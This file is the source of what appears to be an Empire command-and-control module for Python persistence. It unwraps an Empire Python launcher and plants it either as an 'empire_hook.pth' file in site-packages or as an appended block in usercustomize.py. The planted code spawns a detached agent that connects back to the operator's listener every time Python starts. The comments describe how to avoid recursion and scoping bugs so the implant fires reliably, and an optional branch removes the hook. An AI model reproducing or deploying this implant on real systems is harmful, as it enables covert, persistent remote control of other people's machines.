import re

from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule

# Matches the Empire Python listener launcher shell wrapper. All known
# listeners (http, http_malleable, http_hop, smb, http_foreign, etc.)
# emit exactly `echo "<python one-liner>" | python3[.X] [&]`. The regex
# tolerates whitespace drift and python3 version suffixes so a future
# listener tweak does not silently break this module.
_PYTHON_LAUNCHER_RE = re.compile(
    r'^\s*echo\s+"(?P<payload>.+?)"\s*\|\s*python3(?:\.\d+)?\s*&?\s*$',
    re.DOTALL,
)


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        method = params["Method"]
        cleanup = params.get("Cleanup", "False").lower() == "true"

        if cleanup:
            return f"""
import site
import os

method = {method!r}

if method == "pth":
    removed = False
    candidates = []
    try:
        candidates += site.getsitepackages()
    except AttributeError:
        pass
    try:
        candidates.append(site.getusersitepackages())
    except AttributeError:
        pass
    for sp in candidates:
        pth_path = os.path.join(sp, "empire_hook.pth")
        if os.path.exists(pth_path):
            try:
                os.remove(pth_path)
                print("[+] Removed: " + pth_path)
                removed = True
            except Exception as e:
                print("[-] Failed to remove " + pth_path + ": " + str(e))
    if not removed:
        print("[*] empire_hook.pth not found in any site-packages directory.")

elif method == "usercustomize":
    try:
        user_site = site.getusersitepackages()
        uc_path = os.path.join(user_site, "usercustomize.py")
        if not os.path.exists(uc_path):
            print("[*] usercustomize.py not found; nothing to clean up.")
        else:
            with open(uc_path, "r") as f:
                content = f.read()
            marker = "# empire-hook"
            if marker not in content:
                print("[*] empire-hook marker not found in usercustomize.py; nothing to clean up.")
            else:
                lines = content.split("\\n")
                out = []
                skip_next = False
                for line in lines:
                    if line == marker:
                        if out and out[-1] == "":
                            out.pop()
                        skip_next = True
                        continue
                    if skip_next:
                        skip_next = False
                        continue
                    out.append(line)
                cleaned = "\\n".join(out)
                if not cleaned.endswith("\\n"):
                    cleaned += "\\n"
                with open(uc_path, "w") as f:
                    f.write(cleaned)
                print("[+] empire-hook block removed from: " + uc_path)
    except Exception as e:
        print("[-] Cleanup failed: " + str(e))

else:
    print("[-] Unknown method: " + method)
"""

        listener_name = params["Listener"]
        user_agent = params.get("UserAgent", "default")
        safe_checks = params.get("SafeChecks", "True")

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            raise ModuleValidationException(f"[!] Invalid listener: {listener_name}")

        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name,
            language="python",
            encode=True,
            user_agent=user_agent,
            safe_checks=safe_checks,
        )
        if not launcher or not launcher.strip():
            raise ModuleValidationException("[!] Error in launcher command generation.")

        # The Python launcher ships as `echo "<python code>" | python3 &`.
        # Unwrap to get just the inner one-liner.
        match = _PYTHON_LAUNCHER_RE.match(launcher)
        if not match:
            raise ModuleValidationException(
                f"[!] Unexpected launcher format; expected 'echo \"...\" | python3 &'. "
                f"Got: {launcher[:120]!r}"
            )
        inner = match.group("payload")

        if not inner.startswith("import "):
            raise ModuleValidationException(
                "[!] Unwrapped launcher does not start with 'import '; "
                "cannot build hook."
            )

        # Build a .pth hook line that spawns a detached subprocess running
        # the launcher. Three things matter:
        #
        # 1) Running inline inside site.addpackage() triggers a Python
        #    scoping bug: addpackage is a function, so exec(line) uses its
        #    function frame for "module level". Functions defined in the
        #    nested exec'd agent capture addpackage's frozen-site globals
        #    instead of the snapshot where module-level vars like `q`
        #    live, and later fail with NameError. Running the launcher in
        #    a subprocess gives it a fresh `__main__` scope where exec
        #    semantics are clean.
        #
        # 2) The subprocess must not itself recurse into .pth processing,
        #    or every python invocation fork-bombs into an exponential
        #    agent storm. We set EMPIRE_HOOK_FIRED in the child env and
        #    gate the whole line on it, so nested pythons see the marker
        #    and short-circuit to a no-op.
        #
        # 3) The line must begin with `import ` for site.addpackage to
        #    exec it in the first place. An `import` followed by `;` and
        #    an expression-statement is a valid single-line compound.
        #
        # repr() produces a safe single-line Python string literal with
        # any embedded quotes / backslashes in the launcher escaped.
        pth_line = (
            "import os,sys,subprocess;"
            "os.environ.get('EMPIRE_HOOK_FIRED') or "
            f"subprocess.Popen([sys.executable,'-c',{inner!r}],"
            "env=dict(os.environ,EMPIRE_HOOK_FIRED='1'),"
            "stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,"
            "stderr=subprocess.DEVNULL,start_new_session=True)"
        )

        # For usercustomize the inline form already works (usercustomize.py
        # is imported as a real module, so exec scope is fine), but we use
        # the same subprocess form for consistency and to avoid blocking
        # every python invocation on a staging network round-trip. The
        # EMPIRE_HOOK_FIRED guard also prevents the same fork-bomb issue
        # if a user happens to have BOTH .pth and usercustomize installed.
        uc_line = pth_line

        return f"""
import site
import os

pth_line = {pth_line!r}
uc_line = {uc_line!r}
method = {method!r}

if method == "pth":
    try:
        site_packages = site.getsitepackages()
        target_dir = None
        for sp in site_packages:
            if os.path.exists(sp) and os.access(sp, os.W_OK):
                target_dir = sp
                break
        if not target_dir:
            target_dir = site.getusersitepackages()
            os.makedirs(target_dir, exist_ok=True)
        pth_path = os.path.join(target_dir, "empire_hook.pth")
        with open(pth_path, "w") as f:
            f.write(pth_line + "\\n")
        print("[+] .pth file written to: " + pth_path)
        print("[+] Subprocess launcher will fire on every Python interpreter startup.")
    except Exception as e:
        print("[-] Failed to write .pth file: " + str(e))

elif method == "usercustomize":
    try:
        user_site = site.getusersitepackages()
        os.makedirs(user_site, exist_ok=True)
        uc_path = os.path.join(user_site, "usercustomize.py")
        existing = ""
        if os.path.exists(uc_path):
            with open(uc_path, "r") as f:
                existing = f.read()
        marker = "# empire-hook"
        if marker in existing:
            print("[*] usercustomize.py already contains empire-hook marker; skipping.")
        else:
            with open(uc_path, "a") as f:
                f.write("\\n" + marker + "\\n")
                f.write(uc_line + "\\n")
            print("[+] usercustomize.py updated at: " + uc_path)
            print("[+] Subprocess launcher will fire on every Python startup for this user.")
    except Exception as e:
        print("[-] Failed to modify usercustomize.py: " + str(e))

else:
    print("[-] Unknown method: " + method)
"""
